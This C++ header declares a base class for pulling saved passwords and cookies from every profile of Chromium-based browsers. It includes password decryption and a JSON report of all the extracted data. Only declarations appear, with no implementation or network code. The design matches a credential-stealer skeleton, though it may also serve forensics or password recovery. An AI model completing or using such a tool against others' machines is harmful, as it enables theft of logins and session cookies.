#pragma once

#include <windows.h>
#include <string>
#include <vector>
#include <memory>

/**
 * Base class for Chromium-based browsers (Chrome, Edge, Brave, etc.)
 * Contains common functionality for password and cookie extraction
 */
class ChromiumBase {
public:
    struct ChromiumPassword {
        std::string url;
        std::string username;
        std::string password;
        
        ChromiumPassword(const std::string& u, const std::string& user, const std::string& pass)
            : url(u), username(user), password(pass) {}
    };
    
    struct ChromiumCookie {
        std::string host;
        std::string name;
        std::string value;
        std::string path;
        bool secure;
        bool httponly;
        
        ChromiumCookie(const std::string& h, const std::string& n, const std::string& v)
            : host(h), name(n), value(v), path("/"), secure(false), httponly(false) {}
    };
    
    struct ChromiumProfile {
        std::wstring name;
        std::wstring path;
        
        ChromiumProfile(const std::wstring& n, const std::wstring& p)
            : name(n), path(p) {}
    };

protected:
    std::string browser_name_;
    std::wstring browser_path_;
    std::vector<ChromiumProfile> profiles_;
    
public:
    /**
     * Constructor
     * @param browser_name Name of the browser (Chrome, Edge, etc.)
     * @param browser_path Path to browser installation
     */
    ChromiumBase(const std::string& browser_name, const std::wstring& browser_path);
    
    /**
     * Virtual destructor
     */
    virtual ~ChromiumBase() = default;
    
    /**
     * Find all browser profiles
     * @return true if profiles found
     */
    virtual bool FindProfiles();
    
    /**
     * Extract passwords from all profiles
     * @return Vector of passwords
     */
    virtual std::vector<ChromiumPassword> ExtractPasswords();
    
    /**
     * Extract cookies from all profiles
     * @return Vector of cookies
     */
    virtual std::vector<ChromiumCookie> ExtractCookies();
    
    /**
     * Generate JSON report for all extracted data
     * @return JSON string containing all browser data
     */
    virtual std::string GenerateReport();
    
    /**
     * Get browser name
     * @return Browser name string
     */
    const std::string& GetBrowserName() const { return browser_name_; }
    
    /**
     * Get number of profiles found
     * @return Profile count
     */
    size_t GetProfileCount() const { return profiles_.size(); }

protected:
    /**
     * Extract passwords from specific profile
     * @param profile Profile to extract from
     * @return Vector of passwords
     */
    virtual std::vector<ChromiumPassword> ExtractPasswordsFromProfile(const ChromiumProfile& profile);
    
    /**
     * Extract cookies from specific profile
     * @param profile Profile to extract from
     * @return Vector of cookies
     */
    virtual std::vector<ChromiumCookie> ExtractCookiesFromProfile(const ChromiumProfile& profile);
    
    /**
     * Decrypt Chromium password
     * @param encrypted_password Encrypted password blob
     * @return Decrypted password string
     */
    virtual std::string DecryptPassword(const std::vector<uint8_t>& encrypted_password);
    
    /**
     * Get browser-specific profile search paths
     * @return Vector of paths to search for profiles
     */
    virtual std::vector<std::wstring> GetProfileSearchPaths() = 0;
    
    /**
     * Get browser-specific database names
     * @return Pair of password/cookie database names
     */
    virtual std::pair<std::string, std::string> GetDatabaseNames() = 0;
    
    /**
     * Escape JSON special characters
     * @param str Input string
     * @return Escaped string safe for JSON
     */
    std::string EscapeJson(const std::string& str);
};